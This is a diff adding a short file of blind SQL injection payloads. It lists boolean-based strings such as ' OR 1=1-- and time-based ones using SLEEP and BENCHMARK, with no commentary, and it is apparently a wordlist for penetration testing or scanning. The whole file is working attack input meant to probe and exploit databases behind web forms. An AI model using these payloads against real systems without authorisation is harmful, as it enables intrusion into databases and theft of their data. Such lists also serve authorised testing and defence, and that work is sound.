@@ -1,0 +1,7 @@
+# SQL Injection Payloads - Blind
+
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('A'))--
+' OR 1=1--
